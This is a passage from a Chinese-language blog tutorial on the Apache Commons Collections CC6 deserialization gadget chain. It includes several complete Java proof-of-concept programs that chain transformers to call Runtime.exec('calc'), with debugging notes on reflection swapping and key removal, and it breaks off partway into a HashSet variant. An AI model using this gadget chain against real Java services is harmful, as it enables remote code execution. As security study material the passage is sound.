java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(o,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有报错，但是还是没有成功反序列化，否则应该会弹出两个计算机。</p>
<p>调试一下，加断点如下：<br><img src="/2024/08/13/CC6/image-20240728215134473.png" alt="image-20240728215134473"></p>
<p>在调试过程中发现如下情况</p>
<p><img src="/2024/08/13/CC6/image-20240728215245419.png" alt="image-20240728215245419"></p>
<p>也就是这里的if条件并没有通过，还显示一个null，不是很懂，看了一下其他文章，改一下POC，</p>
<p><strong>同时解决一个问题</strong>：在序列化之前调用<code>put()</code>时会弹出计算机的问题<br><u>思路</u>：可以先传入一个假的“链”，在put过后再调用反射将这个利用链传回去。</p>
<p>看这个ChainedTransformer的利用的变量：<br><img src="/2024/08/13/CC6/image-20240728220309587.png" alt="image-20240728220309587"></p>
<p><img src="/2024/08/13/CC6/image-20240728220325713.png" alt="image-20240728220325713"></p>
<p>也就是这个<code>iTransformers</code>变量，所以我们可以这样干，看代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先定义一个假的transformer</span></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//再声明一个利用链</span></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先传入假的transformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(outerMap,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在put过后，在序列化之前，调用反射将假的链换成真的chainpart</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"><span class="comment">//然后再进行序列化</span></span><br></pre></td></tr></table></figure>

<p>整合进全部代码就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(outerMap,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功不再弹出由于put而引起的计算机</p>
<p><strong>然后回到之前的问题</strong>，为什么没有反序列化成功弹出计算机？同样调试一下，发现：</p>
<p><img src="/2024/08/13/CC6/image-20240728223257063.png" alt="image-20240728223257063"></p>
<p>这里的key是fupanc，也就是我们**在实例化时<code>TiedMapEntry</code>传入的”fupanc”**，对于<u>这里的key为fupanc</u>很正常</p>
<p><img src="/2024/08/13/CC6/image-20240728223445809.png" alt="image-20240728223445809"></p>
<p>但是这里的get()方法的if条件没有通过的原因，也就是说明有对象中有fupanc这个键，那么为什么会出现这个现象呢，看代码</p>
<p><img src="/2024/08/13/CC6/image-20240728233400836.png" alt="image-20240728233400836"></p>
<p>原因就是这个，put方法追溯源码后也会调用hashCode()方法，但是我们这里传入了<code>TiedMapEntry</code>类对象的outerMap，所以这里也会进入到<code>LazyMap#get()</code>，剩下重点看get()方法的源码：<br><img src="/2024/08/13/CC6/image-20240728233650715.png" alt="image-20240728233650715"></p>
<p>我们第一次确实是没有key为fupanc的键值对，但是看<code>get()</code>方法的源码，在进入if条件后，这里经过transform方法返回value，在if语句的最后调用了<code>this.map.put(key,value);</code> 也就是调用了HashMap的put方法并传入了一个key为fupanc，value为1的键值对（Key&#x3D;fupanc，Value&#x3D;1），所以我们在反序列化的时候会因为对象中有这个键为<code>fupanc</code>的键值对而失败。</p>
<p>解决方法：很简单，在调用put方法后，我们再调用remove方法来删掉这个键值对即可（一<u>定要注意键值对所属对象的问题</u>）。</p>
<p>那么最终的POC为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(outerMap,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        haha.remove(<span class="string">&quot;fupanc&quot;</span>);<span class="comment">//这里注意fupanc所属对象，使用lazy也行</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机：</p>
<p><img src="/2024/08/13/CC6/image-20240728235059699.png" alt="image-20240728235059699"></p>
<h4 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h4><p>总结前面的问题：</p>
<ul>
<li>无法序列化Process对象问题</li>
<li>序列化之前弹计算机的解决方法</li>
<li>需要remove的原因。</li>
</ul>
<h3 id="利用HashSet链"><a href="#利用HashSet链" class="headerlink" title="利用HashSet链"></a>利用HashSet链</h3><p>ysoserial链介绍了<code>java.util.HashSet</code>作为反序列化的入口，在HashSet类的readObject()方法的最后，会触发map.put方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Consume and ignore stream fields (currently zero).</span></span><br><span class="line">        s.readFields();</span><br><span class="line">        <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Clamp load factor to range of 0.25...4.0.</span></span><br><span class="line">        loadFactor = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> + size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">        <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">        capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Constructing the backing map will lazily create an array when the first element is</span></span><br><span class="line">        <span class="comment">// added, so check it before construction. Call HashMap.tableSizeFor to compute the</span></span><br><span class="line">        <span class="comment">// actual allocation size. Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what is actually created.</span></span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess()</span><br><span class="line">                     .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点就是最后的for循环：<br><img src="/2024/08/13/CC6/image-20240729135002089.png" alt="image-20240729135002089"></p>
<p>这里的map同样是一个HashMap对象，HashMap.put方法前面也说过，源码放过来一下：</p>
<p><img src="/2024/08/13/CC6/image-20240729134636749.png" alt="image-20240729134636749"></p>
<p>所以然后调用hash()  &#x3D;&#x3D;&gt;  hashCode() &#x3D;&#x3D;&gt;  getValue() &#x3D;&#x3D;&gt; get() &#x3D;&#x3D;&gt; transform()也就是我们已经熟悉的操作了。</p>
<p><u>所以在前面的</u><code>HashSet#readObject()</code><u>中的e需要为</u><code>TiedMapEntrry</code><u>类实例</u></p>
<p>来稍微看一下HashSet类的变量：</p>
<p><img src="/2024/08/13/CC6/image-20240729142444842.png" alt="image-20240729142444842"></p>
<p>这里直接说明了<code>PRESENT</code>的值为Object类的实例。并且注意看HashSet类的构造方法，好像基本上都是直接将map定义为HashMap类的实例。所以这里<strong>在利用HaseSet类时直接放心将map直接当做HashMap对象即可</strong>。</p>
<p>在HashSet中提供了一个add方法：<br><img src="/2024/08/13/CC6/image-20240729143154596.png" alt="image-20240729143154596"></p>
<p>这个方法的作用就是向 <code>HashSet</code> 中添加一个元素。如果该元素已经存在于 <code>HashSet</code> 中，那么不会添加，并且返回 <code>false</code>。否则，会将该元素添加到 <code>HashSet</code> 中，并返回 <code>true</code>。</p>
<p>测试一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        System.out.println(hash.add(<span class="string">&quot;fupanc&quot;</span>));</span><br><span class="line">        System.out.println(hash.add(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">        System.out.println(hash.add(<span class="string">&quot;fupanc&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*output:</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">false</span></span><br></pre></td></tr></table></figure>

<p>调试一下，在true部分加断点：<br><img src="/2024/08/13/CC6/image-20240729144247770.png" alt="image-20240729144247770"></p>
<p>进入add()方法源码</p>
<p><img src="/2024/08/13/CC6/image-20240729144117162.png" alt="image-20240729144117162"></p>
<p>随后确实进入了put方法，：</p>
<p><img src="/2024/08/13/CC6/image-20240729144348512.png" alt="image-20240729144348512"></p>
<p>同时跟一下源码，确实进行了在HashMap中的put操作。为了方便理解这里的返回true和false的区别，还是用代码来说明：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        System.out.println(hash.add(<span class="string">&quot;fupanc&quot;</span>));</span><br><span class="line">        System.out.println(hash.add(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">        System.out.println(hash.add(<span class="string">&quot;fupanc&quot;</span>));</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        System.out.println(hashMap.put(<span class="string">&quot;fupanc&quot;</span>,<span class="string">&quot;xxxx&quot;</span>));</span><br><span class="line">        System.out.println(hashMap.put(<span class="string">&quot;fupanc&quot;</span>,<span class="string">&quot;xxxx&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*output:</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">false</span></span><br><span class="line"><span class="comment">null</span></span><br><span class="line"><span class="comment">xxxx</span></span><br></pre></td></tr></table></figure>

<p>也就是<strong>在HashMap的put方法中，如果没有键则会成功放入键值对并返回null，否则就会返回键对应的值</strong>。</p>
<p>现在对于前面的add方法返回的布尔值就很好理解了：</p>
<ul>
<li>因为成功put进了fupan键和haha键，所以返回null，与add方法中定义的<code>map.put(e, PRESENT)==null</code>等号成立，<strong>返回ture，表明成功放入键值对</strong>，</li>
<li>而由于前面已经put进了fupanc键，导致再次调用put添加fupanc键返回的是前面定义的fupanc键的value，在这里也就是Object类的实例，但这样并不与null相同，所以<strong>返回的是false，表明并没有成功放入键值对</strong></li>
</ul>
<p>现在也就基本通了，结合前面的HashMap的理解，可以直接编写下面的POC来测试一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span 